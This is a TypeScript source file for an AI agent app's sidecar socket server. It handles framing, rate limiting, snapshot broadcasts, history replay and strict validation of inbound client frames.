/**
 * The headless Bun engine sidecar's socket server.
 *
 * Responsibilities (TRANSPORT-DECISION.md §4, SECURITY-MINIMUM §2):
 *
 *  1. Accept a real `AppSessionController` (normal startup builds it through
 *     `createRuntimeBackedWebAppSession`; explicit P1-0 probes use the fixture
 *     adapter over the same controller seam).
 *  2. Listen on a Unix-domain socket (D6 pin 1 — a socket file, NOT stdio and
 *     NOT a child-IPC pipe, so the engine can outlive its control surface).
 *  3. Raw-forward every controller event to the client: ship the whole
 *     `AppSessionEvent` (incl. `event.message: SDKMessage`), NOT the flattening
 *     `appSessionEventMapper`. Clone-on-serialize (Landmine 2) + JSON-safe
 *     assert (Landmine 1) at the boundary.
 *  4. Validate every inbound frame with `appClientMessageSchema` (the same guard
 *     the WS server uses) and apply the T4/T6/T6b/T7 hardening before any effect.
 *
 * This module has ZERO `electron` imports — it runs under bare Bun. The
 * supervisor (also Electron-free) spawns it; Electron main is merely a client of
 * the supervisor.
 */

import { randomUUID } from 'crypto'
import z from 'zod/v4'
import type { AppSessionController } from '../../src/app-runtime/AppSessionController.js'
import { createMessageEvent } from '../../src/app-runtime/sessionEvents.js'
import type {
  AppPermissionRequest,
  AppPermissionResponse,
  AppSessionEvent,
} from '../../src/app-runtime/sessionEvents.js'
import type { SDKMessage } from '../../src/entrypoints/agentSdkTypes.js'
import type { ToolPermissionContext, ToolPermissionRulesBySource } from '../../src/Tool.js'
import type { PermissionUpdate } from '../../src/types/permissions.js'
import { appClientMessageSchema } from '../../src/web/appSessionProtocol.js'
// C5 (P4-20) — the wire tool-name literal, imported from the ENGINE source the
// runtime mints permission requests with (appRuntimeCanUseTool.ts sets
// `tool_name: tool.name`), so the sidecar's tool gate can never drift from the
// real name. `prompt.js` is a constants-only module (no React graph).
import { ASK_USER_QUESTION_TOOL_NAME } from '../../src/tools/AskUserQuestionTool/prompt.js'
import type {
  AppClientMessage,
  AppSubmitMessage,
  PermissionResponseMessage,
} from '../../src/web/appSessionProtocol.js'
import { parseThreadGoal } from '../../src/utils/threadGoal.js'
import { encodeFrame, FrameDecoder } from '../shared/framing.js'
import {
  checkJsonSafe,
  omitUndefinedObjectProperties,
} from '../shared/jsonSafe.js'
import { scanForSecrets } from '../shared/secretGuard.js'
import {
  MAX_ANSWER_QUESTIONS,
  MAX_FRAME_BYTES,
  MAX_FRAMES_PER_WINDOW,
  MAX_HISTORY_REPLAY_BYTES,
  MAX_HISTORY_REPLAY_FRAMES,
  MAX_OUTBOUND_FRAME_BYTES,
  MAX_PROMPT_BYTES,
  MAX_QUESTION_ANSWER_CHARS,
  MAX_SUGGESTION_SELECTIONS,
  MAX_TEXT_FIELD_CHARS,
  RATE_WINDOW_MS,
} from '../shared/limits.js'
import {
  HISTORY_REPLAY_TRUNCATION_REQUEST_ID,
  PERMISSION_SET_MODE_MODES,
  PROTOCOL_VERSION,
  RUN_CONTROL_VERB_TYPES,
  type AccountVerbMessage,
  type AskUserQuestionAnswerMessage,
  type ClientFrame,
  type OAuthLoginProgress,
  type PermissionContextSnapshot,
  type RemoteVerbMessage,
  type RunControlVerbMessage,
  type ServerFrame,
  type SessionId,
  type SettingsVerbMessage,
  type SlashCatalogEntry,
} from '../shared/protocol.js'
import {
  EDITABLE_SETTING_SOURCES,
  validateEditableSettingValue,
} from '../shared/settingsEditable.js'
import type { SidecarPermissionDomain } from './permissionDomain.js'
import type { SidecarSettingsDomain } from './settingsDomain.js'
import type { SidecarAgentConfigDomain } from './agentConfigDomain.js'
import type { SidecarGoalDomain } from './goalDomain.js'
import type { SidecarMemoryDomain } from './memoryDomain.js'
import type { SidecarTasksDomain } from './tasksDomain.js'
import type { SidecarAgentModeDomain } from './agentModeDomain.js'
import type { SidecarRunControlsDomain } from './runControlsDomain.js'
import {
  createSessionTitleGenerator,
  type SessionTitleDeps,
  type SessionTitleGenerator,
} from './sessionTitleGen.js'
import type { SidecarAccountsDomain } from './accountsDomain.js'
import type { SidecarWorkspaceTrustDomain } from './workspaceTrustDomain.js'
import type { SidecarDiagnosticsDomain } from './diagnosticsDomain.js'
import type { SidecarExtensionsDomain } from './extensionsDomain.js'
import type { SidecarRemoteSettingsDomain } from './remoteSettingsDomain.js'
import type { SidecarSessionsCatalogDomain } from './sessionsCatalogDomain.js'

export type SidecarSocketLike = {
  write(data: Uint8Array): void
  end(): void
}

/** A live client connection on the sidecar socket. */
type Connection = {
  socket: SidecarSocketLike
  decoder: FrameDecoder
  rateWindowStart: number
  rateCount: number
}

export type SidecarServerOptions = {
  sessionId: SessionId
  engineSessionId: string
  controller: AppSessionController
  /**
   * Permissions domain capability (P2-4). Optional because the P1-0 probe
   * fixture has no engine app-state store; when absent, `permission.setMode`
   * fails closed and no `permission.context` snapshots are emitted.
   */
  permissions?: SidecarPermissionDomain
  /**
   * Settings read-seam (P4-3). Optional because the P1-0 probe fixture has no
   * cwd-configured engine; when absent, no `settings.snapshot` frame is emitted.
   */
  settings?: SidecarSettingsDomain
  /**
   * Agent config read-seam (P4-7). Optional because the P1-0 probe fixture has no
   * cwd-configured engine; when absent, no `agent-config.snapshot` frame is emitted.
   */
  agentConfig?: SidecarAgentConfigDomain
  /**
   * Goals read-seam (P4-10). Optional because the P1-0 probe fixture has no engine
   * app-state store; when absent, no `thread-goal.snapshot` frame is emitted.
   */
  goals?: SidecarGoalDomain
  /**
   * Memory read-seam (P4-10). Optional because the P1-0 probe fixture has no
   * cwd-configured engine; when absent, no `memory.snapshot` frame is emitted.
   */
  memory?: SidecarMemoryDomain
  /**
   * Tasks read-seam (P4-9). Optional because the P1-0 probe fixture has no engine
   * app-state store; when absent, no `tasks.snapshot` frame is emitted.
   */
  tasks?: SidecarTasksDomain
  /**
   * Agent-mode / Orchestrator read-seam (P4-8). When present, an
   * `agent-mode.snapshot` frame is emitted on attach and re-broadcast on store
   * change; when absent, no orchestrator frame is emitted.
   */
  agentMode?: SidecarAgentModeDomain
  /**
   * Composer run-controls read-seam + write verbs (P4-24c). When present, a
   * `run-controls.snapshot` frame is emitted on attach and re-broadcast on the
   * store change a `model.set`/`effort.set`/`fast.set` verb causes; when absent,
   * no run-controls frame is emitted and the verbs fail closed.
   */
  runControls?: SidecarRunControlsDomain
  /**
   * Accounts read-seam + lifecycle verbs (P4-5). Optional because the P1-0 probe
   * fixture has no engine; when absent, no `accounts.snapshot` frame is emitted
   * and account verbs fail closed.
   */
  accounts?: SidecarAccountsDomain
  /**
   * Workspace-trust read-seam (P4-14). Optional because the P1-0 probe fixture
   * has no cwd-configured engine; when absent, no `workspace-trust.snapshot`
   * frame is emitted.
   */
  workspaceTrust?: SidecarWorkspaceTrustDomain
  /**
   * Diagnostics read-seam (P4-14). Optional because the P1-0 probe fixture has
   * no cwd-configured engine; when absent, no `diagnostics.snapshot` frame is
   * emitted.
   */
  diagnostics?: SidecarDiagnosticsDomain
  /**
   * Settings extensions read-seam (P4-12). Optional because the P1-0 probe fixture
   * has no cwd-configured engine; when absent, no `extensions.snapshot` is emitted.
   */
  extensions?: SidecarExtensionsDomain
  /**
   * RemoteSettings read-seam + verbs (P4-13, D3 cut scope). Optional because the
   * P1-0 probe fixture has no engine app-state store or cwd-configured command
   * catalog; when absent, no `remoteSettings.snapshot` frame is emitted and
   * RemoteSettings verbs fail closed.
   */
  remoteSettings?: SidecarRemoteSettingsDomain
  /**
   * Sessions catalog read-seam (P4-6a). Optional because the P1-0 probe fixture
   * has no config home to enumerate; when absent, no `sessions.snapshot` frame
   * is emitted.
   */
  sessionsCatalog?: SidecarSessionsCatalogDomain
  /**
   * The session's user-invocable slash commands WITH display metadata (name +
   * description + optional arg hint), built at spawn from the sidecar's
   * `getCommands` catalog (`sessionController.ts`). Sent to each attaching
   * connection on connect as a read-only `slash-catalog.snapshot`, so the composer
   * picker renders rich rows (prototype parity) before the first turn — the engine
   * otherwise ships names-only on the per-turn `system/init.slash_commands`
   * (`QueryEngine.ts:598`). Spawn-frozen, so never re-broadcast. Absent in probe
   * mode / when the catalog load degraded to empty.
   */
  slashCatalog?: readonly SlashCatalogEntry[]
  /**
   * Restored-session history (F2 — decisions/RESTORE-HISTORY.md): the resumed
   * transcript, already converted by the engine's `toSDKMessages` (index.ts
   * converts the SAME `resumeEngineSession().messages` array that seeded the
   * engine — one source, no drift). Replayed to each attaching connection as
   * `replay: true` event frames after `ready`, capped + truncation-signalled.
   * Absent for fresh sessions.
   */
  history?: readonly SDKMessage[]
  /**
   * Idle self-exit TTL in ms (CC-3, docs O1 / SESSION-LIFETIME §2). When no
   * supervisor connection has been active for this long, `onIdle` fires so the
   * process can self-terminate — bounding the lifetime of a host-crash orphan,
   * which otherwise has no reaper until the next app launch (and none at all if
   * its registry row is evicted first). This is an ADDITIVE time-based self-exit,
   * NOT parent-binding (SESSION-LIFETIME L2): the sidecar decides on elapsed idle,
   * never on a parent channel — die-with-window stays supervisor behavior. A live
   * connection cancels the timer; the first disconnect (or construction with zero
   * connections) starts it. `undefined`/`<= 0` disables the timer.
   */
  idleTtlMs?: number
  /**
   * Fires when `idleTtlMs` elapses with zero active connections. `index.ts`
   * passes cleanup()+`process.exit(0)`; tests pass a spy. Never called while a
   * connection is open (a live connection clears the timer). Absent ⇒ the timer
   * is never armed regardless of `idleTtlMs`.
   */
  onIdle?: () => void
  /**
   * P4-6 title-rider: true when this session was resumed (has restored history).
   * A resumed session already carries its title and history, so its first turn
   * this run is a continuation — retitling it from that prompt would mislabel it.
   * The title generator skips generation entirely when set. Defaults to false.
   */
  resumed?: boolean
  /**
   * P4-6 title-rider: override the engine title deps in tests (generate / existing-
   * title check / persist). Absent ⇒ `realSessionTitleDeps` (the TUI machinery),
   * so production never injects and a test never needs the Haiku round-trip.
   */
  titleDeps?: SessionTitleDeps
  /** Structured logger; defaults to stderr. Never logs secrets. */
  log?: (line: string) => void
}

/**
 * Wires a controller to a connection-handling façade. The transport (Bun's
 * `Bun.listen({ unix })`) is created by the caller and delivers raw byte chunks
 * to `handleData`; this class owns framing, validation, and forwarding. Keeping
 * the transport injectable makes the security logic unit-testable without a real
 * socket.
 */
export class SidecarServer {
  private readonly sessionId: SessionId
  private readonly engineSessionId: string
  private readonly controller: AppSessionController
  private readonly permissions: SidecarPermissionDomain | null
  private readonly settings: SidecarSettingsDomain | null
  private readonly agentConfig: SidecarAgentConfigDomain | null
  private readonly goals: SidecarGoalDomain | null
  private readonly memory: SidecarMemoryDomain | null
  private readonly tasks: SidecarTasksDomain | null
  private readonly agentMode: SidecarAgentModeDomain | null
  private readonly runControls: SidecarRunControlsDomain | null
  private readonly accounts: SidecarAccountsDomain | null
  private readonly workspaceTrust: SidecarWorkspaceTrustDomain | null
  private readonly diagnostics: SidecarDiagnosticsDomain | null
  private readonly extensions: SidecarExtensionsDomain | null
  private readonly remoteSettings: SidecarRemoteSettingsDomain | null
  private readonly sessionsCatalog: SidecarSessionsCatalogDomain | null
  private readonly slashCatalog: readonly SlashCatalogEntry[]
  private readonly history: readonly SDKMessage[]
  private readonly idleTtlMs: number
  private readonly onIdle: (() => void) | null
  /** P4-6 title-rider — the one-shot AI-title generator for this session. */
  private readonly titleGenerator: SessionTitleGenerator
  private readonly log: (line: string) => void
  private readonly connections = new Set<Connection>()
  private unsubscribe: (() => void) | null = null
  private unsubscribePermissionContext: (() => void) | null = null
  private unsubscribeGoalSnapshot: (() => void) | null = null
  private unsubscribeMemorySnapshot: (() => void) | null = null
  private unsubscribeTasksSnapshot: (() => void) | null = null
  private unsubscribeAgentModeSnapshot: (() => void) | null = null
  private unsubscribeRunControlsSnapshot: (() => void) | null = null
  private activeTurn = false
  /** One-shot guard for the wham/usage populate (accounts snapshot). */
  private usageRefreshStarted = false
  /** Armed while zero connections are open; cleared on connect/close (CC-3). */
  private idleTimer: ReturnType<typeof setTimeout> | null = null

  constructor(options: SidecarServerOptions) {
    this.sessionId = options.sessionId
    this.engineSessionId = options.engineSessionId
    this.controller = options.controller
    this.permissions = options.permissions ?? null
    this.settings = options.settings ?? null
    this.agentConfig = options.agentConfig ?? null
    this.goals = options.goals ?? null
    this.memory = options.memory ?? null
    this.tasks = options.tasks ?? null
    this.agentMode = options.agentMode ?? null
    this.runControls = options.runControls ?? null
    this.accounts = options.accounts ?? null
    // P4-15 — the OAuth login controller pushes progress through this sink; the
    // server frames it as an `oauth.login.progress` broadcast (and re-broadcasts
    // the accounts snapshot on `success`, so a completed login clears the
    // first-run surface / reauth banner). The domain keeps ZERO transport
    // knowledge — it emits an `OAuthLoginProgress`, the server owns framing.
    this.accounts?.setOAuthProgressSink(progress =>
      this.broadcastOAuthLoginProgress(progress),
    )
    this.workspaceTrust = options.workspaceTrust ?? null
    this.diagnostics = options.diagnostics ?? null
    this.extensions = options.extensions ?? null
    this.remoteSettings = options.remoteSettings ?? null
    this.sessionsCatalog = options.sessionsCatalog ?? null
    this.slashCatalog = options.slashCatalog ?? []
    this.history = options.history ?? []
    this.idleTtlMs = options.idleTtlMs ?? 0
    this.onIdle = options.onIdle ?? null
    this.titleGenerator = createSessionTitleGenerator({
      engineSessionId: this.engineSessionId,
      resumed: options.resumed ?? false,
      ...(options.titleDeps ? { deps: options.titleDeps } : {}),
    })
    this.log = options.log ?? (line => process.stderr.write(`${line}\n`))

    // Subscribe once; broadcast every event to all connected clients as a raw
    // `event` frame. (P1-0 has one client, but the fan-out matches the WS
    // server's broadcast model.)
    this.unsubscribe = this.controller.subscribe(event => {
      this.broadcastEvent(event)
    })

    // C3 (PERMISSION-BOUNDARY.md §4) — emit a fresh snapshot on EVERY live
    // context change. Store-subscription (not emit-after-boundary-writes) is
    // required: the context also mutates without boundary involvement (C1
    // updates applied by the engine's decision path, PermissionRequest hooks
    // applying rules mid-turn).
    if (this.permissions) {
      this.unsubscribePermissionContext =
        this.permissions.subscribeToolPermissionContext(context => {
          this.broadcastPermissionContext(context)
        })
    }
    if (this.goals) {
      this.unsubscribeGoalSnapshot = this.goals.subscribe(() => {
        this.broadcastThreadGoalSnapshot()
      })
    }
    if (this.memory) {
      this.unsubscribeMemorySnapshot = this.memory.subscribe(() => {
        this.broadcastMemorySnapshot()
      })
    }
    if (this.tasks) {
      this.unsubscribeTasksSnapshot = this.tasks.subscribe(() => {
        this.broadcastTasksSnapshot()
      })
    }
    if (this.agentMode) {
      this.unsubscribeAgentModeSnapshot = this.agentMode.subscribe(() => {
        void this.broadcastAgentModeSnapshot()
      })
    }
    // P4-24c — re-broadcast the run-controls snapshot whenever the session's
    // model/effort/fast actually changes. The domain's subscribe is change-detected
    // (no per-token storm), so this fires on a `*.set` verb OR any engine path that
    // moves those fields — the faces reflect live with no respawn.
    if (this.runControls) {
      this.unsubscribeRunControlsSnapshot = this.runControls.subscribe(() => {
        this.broadcastRunControlsSnapshot()
      })
    }

    // CC-3: the server starts with zero connections. A sidecar that is spawned
    // but never attached (a dev-harness spawn, or a supervisor that dies before
    // connecting) must not linger forever — arm the idle timer now. A real
    // supervisor attach cancels it well within the (generous) TTL.
    this.armIdleTimer()
  }

  /* --------------------------------------------------------------------- *
   * CC-3 — idle self-exit timer (SESSION-LIFETIME §2 janitor; L2-additive).
   * --------------------------------------------------------------------- */

  /**
   * Arm the idle timer iff enabled AND currently idle. Fires `onIdle` after
   * `idleTtlMs` of continuous zero-connection time. Re-checks the connection
   * count at fire time (belt-and-suspenders against a race between a late
   * connect and the timer callback).
   */
  private armIdleTimer(): void {
    if (this.idleTtlMs <= 0 || !this.onIdle) return
    if (this.idleTimer) return // already counting down
    if (this.connections.size > 0) return // a live connection: never TTL
    this.idleTimer = setTimeout(() => {
      this.idleTimer = null
      if (this.connections.size === 0) {
        this.log(
          `[sidecar] idle for ${this.idleTtlMs}ms with no supervisor connection — self-exiting (CC-3)`,
        )
        this.onIdle?.()
      }
    }, this.idleTtlMs)
  }

  /** Cancel the idle timer (a connection is open, or the server is closing). */
  private clearIdleTimer(): void {
    if (this.idleTimer) {
      clearTimeout(this.idleTimer)
      this.idleTimer = null
    }
  }

  /** Register a new client connection (called by the transport on connect). */
  addConnection(socket: SidecarSocketLike): Connection {
    // A live connection means this sidecar is attached — never idle-exit while
    // one is open (CC-3).
    this.clearIdleTimer()
    const connection: Connection = {
      socket,
      decoder: new FrameDecoder(MAX_FRAME_BYTES),
      rateWindowStart: Date.now(),
      rateCount: 0,
    }
    this.connections.add(connection)
    // Re-home the `app.ready` handshake onto IPC (AppSessionWebSocketServer.ts
    // :79-87 equivalent).
    const readyPayload = {
      type: 'app.ready' as const,
      protocolVersion: PROTOCOL_VERSION,
      inputEnabled: !this.activeTurn,
      activeTurn: this.activeTurn,
      abort: this.controller.getAbortState(),
      goalSnapshot: this.controller.getGoalSnapshot(),
      pendingPermissionRequests: this.controller.getPendingPermissionRequests(),
    }
    const preparedPayload = this.prepareOutboundPayload(readyPayload, 'ready payload')
    if (preparedPayload) {
      this.send(connection, {
        kind: 'ready',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        engineSessionId: this.engineSessionId,
        payload: preparedPayload,
      })
    }
    // C3 — snapshot on attach, immediately after `ready` (a separate app-owned
    // frame; the engine-owned AppReadyPayload is deliberately not widened).
    if (this.permissions) {
      this.sendPermissionContext(
        connection,
        this.permissions.getToolPermissionContext(),
      )
    }
    // P4-3 — the settings source/precedence snapshot, after C3 (read-only,
    // point-in-time on attach; source/editable/managed model only, no values).
    this.sendSettingsSnapshot(connection)
    // P4-7 — agent definition config snapshot, after settings and before replay.
    this.sendAgentConfigSnapshot(connection)
    // P4-10 — read-only goals + memory snapshots, before replay and with no new
    // inbound vocabulary or renderer-authored state.
    this.sendThreadGoalSnapshot(connection)
    this.sendMemorySnapshot(connection)
    // P4-9 — read-only background-task snapshot, alongside the other P4-10
    // snapshots and before replay; no new inbound vocabulary or renderer-
    // authored task state.
    this.sendTasksSnapshot(connection)
    // P4-8 — read-only orchestrator worker snapshot (persisted agent-mode state ∪
    // live local_agent workers), alongside the P4-9 tasks snapshot. Async + best-
    // effort (a non-agent-mode session degrades to an empty roster); fire-and-forget
    // since a read-only snapshot has no ordering dependency on history replay.
    void this.sendAgentModeSnapshot(connection)
    // P4-24c — composer run-controls snapshot (current model/effort/fast + the real
    // selectable options + availability). Read-at-call + re-broadcast on change; no
    // renderer-authored state (the value/selection rides the app-owned write verbs).
    this.sendRunControlsSnapshot(connection)
    // P4-5 — redacted Codex account pool snapshot (the canonical domain read-seam),
    // after the other snapshots and before replay. Read-only + secretGuard-clean by
    // construction; re-broadcast after any pool-mutating account verb.
    this.sendAccountsSnapshot(connection)
    // The pool loads observation-only in the sidecar (no engine startup path
    // runs `initAccountPool`), so the first snapshot's usage hints are 0/null.
    // Fire the same read-only wham/usage GET the engine runs at startup, ONCE,
    // then re-broadcast the now-populated snapshot. Best-effort — a failure
    // (offline / stale tokens) leaves the initial snapshot untouched.
    this.refreshAccountsUsageOnce()
    // P4-14 — read-only workspace-trust + diagnostics snapshots, after the
    // other snapshots and before replay. Both spawn-time-frozen (no new
    // inbound vocabulary, no renderer-authored state).
    this.sendWorkspaceTrustSnapshot(connection)
    this.sendDiagnosticsSnapshot(connection)
    // P4-12 — read-only settings extensions (MCP/plugins/skills/hooks) config
    // snapshot, after the other snapshots and before replay. No inbound vocabulary.
    this.sendExtensionsSnapshot(connection)
    // P4-13 — RemoteSettings read-seam (bridge status + command-filter truth),
    // after accounts and before replay. Read-only; re-broadcast after a
    // mutating `remoteSettings.*` verb.
    this.sendRemoteSettingsSnapshot(connection)
    // P4-6a — read-only cross-workspace sessions catalog (engine transcript
    // history), after the other snapshots and before replay. Spawn-frozen,
    // secretGuard-clean by construction (display metadata only).
    this.sendSessionsSnapshot(connection)
    // The rich slash-command catalog (name + arg-hint + description), before
    // history + any live event so the composer picker renders prototype-parity
    // rows on a fresh session's very first keystroke. Single-socket ordering
    // guarantees the renderer projects it before the user could type `/`.
    this.sendSlashCatalogSnapshot(connection)
    // F2 — restored-history replay, after ready + C3 and before any live event
    // (single-socket ordering guarantees the renderer sees history first).
    this.sendHistoryReplay(connection)
    return connection
  }

  /**
   * Send the read-only `slash-catalog.snapshot` (name + description + arg hint) to
   * one attaching connection. Display metadata only, secretGuard-clean by
   * construction; still goes through the normal outbound `send` path (secretGuard
   * + size cap). Skipped when the catalog is empty (probe / degraded load).
   */
  private sendSlashCatalogSnapshot(connection: Connection): void {
    if (this.slashCatalog.length === 0) return
    this.send(connection, {
      kind: 'slash-catalog.snapshot',
      protocolVersion: PROTOCOL_VERSION,
      sessionId: this.sessionId,
      commands: [...this.slashCatalog],
    })
  }

  /**
   * F2 (decisions/RESTORE-HISTORY.md) — replay the restored transcript to one
   * attaching connection as standard `event` frames with `replay: true`. The
   * NEWEST contiguous tail is kept under BOTH caps (frames + serialized bytes,
   * the same accounting main's replay buffer uses, so a renderer reload
   * preserves the same history — the ≤-buffer alignment is test-enforced). Any
   * omission emits the truncation-boundary error frame BEFORE the tail (the
   * main replay-buffer idiom): a capped replay is visibly lossy, never a
   * silent gap. Every frame goes through the normal outbound path —
   * prepareOutboundPayload (clone + JSON-safe) and send (secretGuard + size
   * cap) — the replay adds no security bypass.
   */
  private sendHistoryReplay(connection: Connection): void {
    if (this.history.length === 0) return

    const retained: ServerFrame[] = []
    let retainedBytes = 0
    let truncated = false
    // Walk newest → oldest so the cap keeps the most recent history. Stop (not
    // skip) at the first frame that would overflow: a contiguous newest tail,
    // never a mid-history hole.
    for (let i = this.history.length - 1; i >= 0; i--) {
      const message = this.history[i]!
      const prepared = this.prepareOutboundPayload(
        createMessageEvent(message),
        'history replay event',
      )
      if (!prepared) {
        // Un-serializable restored message (should not happen for
        // JSONL-round-tripped content) — an omission, so the replay is lossy.
        truncated = true
        continue
      }
      const frame: ServerFrame = {
        kind: 'event',
        protocolVersion: PROTOCOL_VERSION,
        sessionId: this.sessionId,
        replay: true,
        event: prepared,
      }
      const frameBytes = Buffer.byteLength(JSON.stringify(frame), 'utf8')
      if (
        retained.length + 1 > MAX_HISTORY_REPLAY_FRAMES ||
        retainedBytes + frameBytes > MAX_HISTORY_REPLAY_BYTES
      ) {
        truncated = true
        break
      }
      retained.push(frame)
      retainedBytes += frameBytes
    }
    retained.reverse()

    if (truncated) {
      this.log(
        `[sidecar] history replay truncated: retained ${retained.length}/${this.history.length} events (${retainedBytes} bytes)`,
      )
      this.sendError(
        connection,
        HISTORY_REPLAY_TRUNCATION_REQUEST_ID,
        'internal_error',
        'Earlier restored-session history was omitted because it exceeded the replay retention limit.',
        false,
      )
    }
    for (const frame of retained) {
      this.send(connection, frame)
    }
  }

  removeConnection(connection: Connection): void {
    this.connections.delete(connection)
    // CC-3: the last supervisor connection just dropped (e.g. a host crash left
    // this sidecar orphaned). Start the idle countdown; a reconnect within the
    // TTL cancels it again.
    if (this.connections.size === 0) {
      this.armIdleTimer()
    }
  }

  /** Feed a raw socket chunk for a given connection. */
  handleData(connection: Connection, chunk: Buffer): void {
    const results = connection.decoder.push(chunk)
    for (const result of results) {
      if (result.kind === 'error') {
        this.sendError(connection, undefined, 'bad_request', result.reason, false)
        // A framing error is unrecoverable; close the connection.
        connection.socket.end()
        this.removeConnection(connection)
        return
      }

      if (!this.checkRate(connection)) {
        this.sendError(
          connection,
          undefined,
          'bad_request',
          'rate limit exceeded',
          true,
        )
        continue
      }

      this.handleFrame(connection, result.payload)
    }
  }

  /** Tear down the controller + permission-context subscriptions. */
  close(): void {
    this.clearIdleTimer()
    this.unsubscribe?.()
    this.unsubscribe = null
    this.unsubscribePermissionContext?.()
    this.unsubscribePermissionContext = null
    this.unsubscribeGoalSnapshot?.()
    this.unsubscribeGoalSnapshot = null
    this.unsubscribeMemorySnapshot?.()
    this.unsubscribeMemorySnapshot = null
    this.unsubscribeTasksSnapshot?.()
    this.unsubscribeTasksSnapshot = null
    this.unsubscribeAgentModeSnapshot?.()
    this.unsubscribeAgentModeSnapshot = null
    this.unsubscribeRunControlsSnapshot?.()
    this.unsubscribeRunControlsSnapshot = null
    for (const connection of this.connections) {
      connection.socket.end()
    }
    this.connections.clear()
  }

  /* --------------------------------------------------------------------- *
   * Inbound (client → engine): validate, then apply. Trust boundary here.
   * --------------------------------------------------------------------- */

  private handleFrame(connection: Connection, payload: unknown): void {
    // Envelope check: protocol version + session addressing.
    if (
      typeof payload !== 'object' ||
      payload === null ||
      (payload as ClientFrame).protocolVersion !== PROTOCOL_VERSION
    ) {
      this.sendError(
        connection,
        undefined,
        'bad_request',
        'missing or wrong protocolVersion',
        false,
      )
      return
    }

    const frame = payload as Partial<ClientFrame>
    if (frame.sessionId !== this.sessionId) {
      // In P1-0 there is one sidecar per sessionId; a mismatched address is a
      // routing bug or a forged frame. Reject rather than act on it.
      this.sendError(
        connection,
        undefined,
        'bad_request',
        'sessionId does not address this sidecar',
        false,
      )
      return
    }

    // F10 — strict allowlist. The reused Zod objects STRIP unknown keys rather
    // than reject them, so a frame like `{type:"app.ping", nonce, runCommand}`
    // would silently pass. The contract (SECURITY-MINIMUM §2, ".strict()",
    // "everything else rejected and logged") requires rejection. Enforce it with
    // an explicit key allowlist before the schema parse.
    const strictError = checkStrictKeys(frame.message)
    if (strictError) {
      this.log(`[sidecar] rejected frame with unexpected keys: ${strictError}`)
      this.sendError(connection, undefined, 'bad_request', strictError, false)
      return
    }

    // C2 — `permission.setMode` is app-owned vocabulary validated by a
    // sidecar-LOCAL schema (PERMISSION-BOUNDARY.md §3). The engine's shared
    // `appClientMessageSchema` is deliberately NOT extended: the WS server
    // shares it and must not silently start accepting a frame it has no
    // handler for (Phase-3 F3 owns any consolidation).
    if (
      (frame.message as { type?: unknown } | null | undefined)?.type ===
      'permission.setMode'
    ) {
      this.handleSetMode(connection, frame.message)
      return
    }

    // C5 (P4-20, ASK-USER-QUESTION-ANSWER.md) — the AskUserQuestion answer is
    // app-owned vocabulary validated by a sidecar-LOCAL schema (like C2), then
    // resolved through the engine's OWN `respondToPermissionRequest` allow path.
    // The engine's shared `appClientMessageSchema` is deliberately NOT extended.
    if (
      (frame.message as { type?: unknown } | null | undefined)?.type ===
      'askUserQuestion.answer'
    ) {
      this.handleAskUserQuestionAnswer(connection, frame.message)
      return
    }

    // P4-5 — account lifecycle verbs are app-owned vocabulary (like C2), each
    // validated by a sidecar-LOCAL schema and dispatched to the engine's own
    // account machinery. The engine's shared schema is deliberately not extended.
    const messageType = (frame.message as { type?: unknown } | null | undefined)
      ?.type
    if (typeof messageType === 'string' && messageType.startsWith('account.')) {
      this.handleAccountVerb(connection, frame.message)
      return
    }

    // P4-13 — RemoteSettings verbs are app-owned vocabulary (like C2 and the
    // P4-5 account verbs), validated by a sidecar-LOCAL schema and dispatched
    // to the engine's own bridge/direct-connect primitives.
    if (
      typeof messageType === 'string' &&
      messageType.startsWith('remoteSettings.')
    ) {
      this.handleRemoteSettingsVerb(connection, frame.message)
      return
    }

    // P4-19 — the settings WRITE verb is app-owned vocabulary (like C2 and the
    // account/RemoteSettings verbs), validated by a sidecar-LOCAL schema + the
    // closed EDITABLE_SETTINGS allowlist and applied through the engine's
    // SettingsUpdater-under-lock form. NOT part of the engine's shared schema.
    if (typeof messageType === 'string' && messageType.startsWith('settings.')) {
      this.handleSettingsVerb(connection, frame.message)
      return
    }

    // P4-15 — the workspace-trust accept verb is app-owned vocabulary (like C2
    // and the account/RemoteSettings/settings verbs), validated by a sidecar-
    // LOCAL schema and dispatched to the engine's OWN trust persistence
    // (`saveCurrentProjectConfig`). NOT part of the engine's shared schema.
    if (typeof messageType === 'string' && messageType.startsWith('workspace.')) {
      this.handleWorkspaceTrustVerb(connection, frame.message)
      return
    }

    // P4-8b — the agent-mode set verb is app-owned vocabulary (like C2 and the
    // account/RemoteSettings/settings/workspace verbs), validated by a sidecar-
    // LOCAL schema and dispatched to the engine's OWN `matchSessionMode` (a live
    // env switch, no respawn). NOT part of the engine's shared schema.
    if (typeof messageType === 'string' && messageType.startsWith('agent-mode.')) {
      this.handleAgentModeSet(connection, frame.message)
      return
    }

    // P4-24c — the composer run-control set verbs (model.set / effort.set /
    // fast.set) are app-owned vocabulary (like C2 and the account/RemoteSettings/
    // settings/workspace/agent-mode verbs), validated by a sidecar-LOCAL schema and
    // dispatched to the engine's OWN per-session setters (a live change, no
    // respawn). NOT part of the engine's shared schema. Membership test (three
    // distinct prefixes) rather than a single startsWith.
    if (
      typeof messageType === 'string' &&
      (RUN_CONTROL_VERB_TYPES as readonly string[]).includes(messageType)
    ) {
      this.handleRunControlVerb(connection, frame.message)
      return
    }

    // The message payload MUST pass the existing allowlist schema. Anything
    // else is dropped at the boundary (SECURITY-MINIMUM §2, R2 — validate at
    // the trust boundary, never trust the preload).
    const parsed = appClientMessageSchema.safeParse(frame.message)
    if (!parsed.success) {
      this.sendError(
        connection,
        undefined,
        'bad_request',
        parsed.error.issues[0]?.message ?? 'invalid message',
        false,
      )
      return
    }

    this.dispatch(connection, parsed.data, frame.message)
  }

  private dispatch(
    connection: Connection,
    message: AppClientMessage,
    rawMessage: unknown,
  ): void {
    switch (message.type) {
      case 'app.ping':
        if (message.nonce.length > MAX_TEXT_FIELD_CHARS) {
          this.sendError(connection, undefined, 'bad_request', 'nonce too long', false)
          return
        }
        this.send(connection, {
          kind: 'pong',
          protocolVersion: PROTOCOL_VERSION,
          sessionId: this.sessionId,
          nonce: message.nonce,
        })
        return

      case 'app.abort':
        if ((message.reason?.length ?? 0) > MAX_TEXT_FIELD_CHARS) {
          this.sendError(
            connection,
            message.requestId,
            'bad_request',
            'abort reason too long',
            false,
          )
          return
        }
        this.controller.abort(message.reason)
        return

      case 'permission.response':
        this.handlePermissionResponse(connection, message, rawMessage)
        return

      case 'app.submit':
        this.handleSubmit(connection, message)
        return
    }
  }

